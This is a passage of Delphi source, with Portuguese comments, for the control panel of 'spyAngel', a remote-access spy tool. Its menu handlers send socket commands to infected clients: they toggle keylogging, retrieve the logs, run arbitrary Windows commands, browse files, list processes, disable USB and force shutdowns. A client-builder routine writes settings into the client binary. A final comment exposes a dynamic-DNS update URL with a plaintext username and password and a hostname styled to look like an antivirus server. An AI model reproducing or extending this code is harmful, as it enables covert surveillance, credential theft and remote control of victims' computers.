    Compartilhador := TForm3.Create(self);
    Compartilhador.Caption := 'spyAngel - Compartilhador de Arquivos de "' + LV1.Selected.SubItems[0] + '"';
    Compartilhador.Show;
    LV1.Selected.SubItems.Objects[4] := TObject(Compartilhador);
    Compartilhador.Socket:=TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Compartilhador.Socket.SendText('<|Fold|>C:\<<|');
    Compartilhador.Edit1.Text := 'C:\';
  end
  else
  begin
    (LV1.Selected.SubItems.Objects[4] as TForm3).Show;
  end;
end;

procedure TForm1.GridLines1Click(Sender: TObject);
begin
  if(LV1.GridLines=True)then
    LV1.GridLines:=False
  else
    LV1.GridLines:=True;
  atualizaXML;
end;

procedure TForm1.Logoff1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|ProcExe|>shutdown /l<<|');
  except
    exit;
  end;
end;

procedure TForm1.Logout1Click(Sender: TObject);
begin// logout pelo menu
  Logout();
end;

procedure TForm1.Logout2Click(Sender: TObject);
begin //logout pelo trayicon
  Form1.TrayIcon1.Visible:=False;
  Logout();
end;

procedure TForm1.LV1ColumnClick(Sender: TObject; Column: TListColumn);
begin
 if ColIndex = Column.Index then
  begin
    { Se a coluna clicada eh a mesma que ja esta, troca a ordem}
    OrdAscCol := not(OrdAscCol);
    LV1.AlphaSort;
  end else
  begin
    { Sendo a coluna diferente da clicada anteriormente}
    OrdAscCol := true;
    ColIndex:= Column.Index;
    LV1.AlphaSort;
  end;
end;

procedure TForm1.LV1Compare(Sender: TObject; Item1, Item2: TListItem;
  Data: Integer; var Compare: Integer);
begin
{ Para reorganizar o ListView de acordo com a coluna clicada}
  If ColIndex = 0 Then
  begin
    { Organização pelo caption do item de acordo com a ordem ascendente ou não}
    if OrdAscCol then
      Compare:= CompareText(Item1.Caption, Item2.Caption)
    else
      Compare:= CompareText(Item2.Caption, Item1.Caption);
  end else
  begin
    { Organização pelos subitems, tb de acordo com a ordem ascendente ou não}
    if OrdAscCol then
      Compare:= CompareText(Item1.SubItems[ColIndex-1],Item2.SubItems[ColIndex-1])
    else
      Compare:= CompareText(Item2.SubItems[ColIndex-1], Item1.SubItems[ColIndex-1]);
  end;
end;

procedure TForm1.ModoKeyHook1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|keyhk|><<|');
  except
    exit;
  end;
end;

procedure TForm1.ModoTimer1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|keytr|><<|');
  except
    exit;
  end;
end;

procedure TForm1.MostrarClick(Sender: TObject);
begin
  if(form1.Visible=False)then begin
    Form1.Show();
    Application.BringToFront;
  end else begin
    Mostrar.Caption:='Mostrar';
    Form1.Hide();
  end;
end;

procedure TForm1.OcultaraofecharClick(Sender: TObject);
begin
  atualizaXML;
end;

procedure TForm1.Outros1Click(Sender: TObject);
var cmd :String;
  Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    cmd:=InputBox('Executar(CMD)','Digite o comando a ser executado (Ex: Help)','');
    if(cmd='Help') or (cmd='help')then
      showmessage('Podem ser executados todos os comandos do Windows: start, del, attrib, mkdir, shutdown...')
    else
      Socket.SendText(AnsiString('<|ProcExe|>'+cmd+'<<|'));
  except
    exit;
  end;
end;

procedure TForm1.contatarErroClick(Sender: TObject);
begin
showmessage('1 - Verifique suas configurações de Firewall.'+#13#10#13#10+
  '2 - Usa Roteador?'+#13#10+'Verifique as configurações de redirecionamento de portas.');
end;

procedure TForm1.processosClick(Sender: TObject);
var
  frmProcessos: TForm5;
  Socket: TCustomWinSocket;
begin
  if LV1.ItemIndex < 0 then
    exit;

  if ((LV1.Selected.SubItems.Objects[4] = nil)or(LV1.Selected.SubItems.Objects[4]<>TObject(frmProcessos)))then
  begin
    frmProcessos := TForm5.Create(self);
    frmProcessos.Caption := 'Processos Windows de "' +LV1.Selected.SubItems[0] + '"';
    frmProcessos.Show;
    LV1.Selected.SubItems.Objects[4] := TObject(frmProcessos);

    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    frmProcessos.Socket := Socket;
    frmProcessos.Socket.SendText('<|Processos|>ccc<<|');
  end
  else
  begin
    (LV1.Selected.SubItems.Objects[4] as TForm5).Show;
  end;
end;

procedure TForm1.PtbrClick(Sender: TObject);
var regi:TRegistry;
begin
  asm nop end;
  regi := TRegistry.Create;
  regi.rootKey := HKEY_CURRENT_USER;
  regi.OpenKey('Software\Conamy\AngelServer\Options', True);
//  regi.WriteInteger('language', idioma);
  regi.CloseKey;
end;

procedure TForm1.ReceberDados1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
try
  if LV1.ItemIndex < 0 then
    exit;
  Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
  Socket.SendText('<|loggs|><<|');
except
  exit;
end;
end;

procedure TForm1.ApplicationEvents1Exception(Sender: TObject; E: Exception);
begin
  Exit;
end;

procedure TForm1.btnInitClick(Sender: TObject);
begin
  if(btnInit.Caption='&Ativar')then
  begin
    LV1.Enabled := true;
    btnInit.Caption:='Desativar';
    SS1.Port := porta;
    SS1.Active := true;
  end
  else
  begin
    LV1.Enabled := false;
    btnInit.Caption := 'Ativar';
    StatusBar1.Panels.Items[1].Text := 'Desativado';
    SS1.Active := false;
    LV1.Clear;
  end;
end;

procedure TForm1.Chato1Click(Sender: TObject);
var
  Nome: String;
  OK: boolean;
  Chat: TForm4;
begin
  if LV1.ItemIndex < 0 then
    exit;

  OK := inputQuery('Chat com "' + LV1.Selected.SubItems[0] + '"','Digite seu nome:', Nome);
  if OK then
  begin
    if LV1.Selected.SubItems.Objects[6] = nil then
    begin
      Chat := TForm4.Create(self);
      Chat.Nome := Nome;
      Chat.Caption := 'Chat com "' + LV1.Selected.SubItems[0] + '"';
      Chat.Show;
      Chat.Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
      Chat.Socket.SendText('<|OpenChat|>');
      LV1.Selected.SubItems.Objects[6] := TObject(Chat);
    end;
  end;
end;

procedure TForm1.ContatoClick(Sender: TObject);
begin
  ShellExecute(Handle, 'open', 'http://spyangel.tk', '', '', 1);
end;

procedure TForm1.CreditoClick(Sender: TObject);
begin
showmessage('Software of intelligence spy created by spyAngel.tk');
end;

procedure TForm1.Desativado1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|keyof|><<|');
  except
    exit;
  end;
end;

procedure TForm1.Desativar1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|usboff|><<|');
  except
    exit;
  end;
end;

procedure TForm1.Descriptografar1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|decryp2|><<|');
  except
    exit;
  end;
end;

procedure TForm1.Desligar1Click(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|ProcExe|>shutdown /s<<|');
  except
    exit;
  end;
end;

procedure TForm1.EditarCliente1Click(Sender: TObject);
var Data: PConfig;
begin
  new(Data);
  Data.Temp:= ShortString(Form1.IdUser);
if OpenDialog1.Execute then begin
  if WriteSettings(PChar(OpenDialog1.FileName),Data)then
    showmessage('Suas configurações foram gravadas com sucesso!')
  else
    showmessage('Ocorreu erro, verifique se o programa esta em execução.');
  end;
end;

procedure TForm1.ReiniciarClick(Sender: TObject);
var Socket: TCustomWinSocket;
begin
  try
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Socket.SendText('<|ProcExe|>shutdown /r<<|');
  except
    exit;
  end;
end;

{http://kodels2:123qwe.@dynupdate.no-ip.com/nic/update?hostname=avastserver.webhop.me&myip=104.25.33.24}
end.
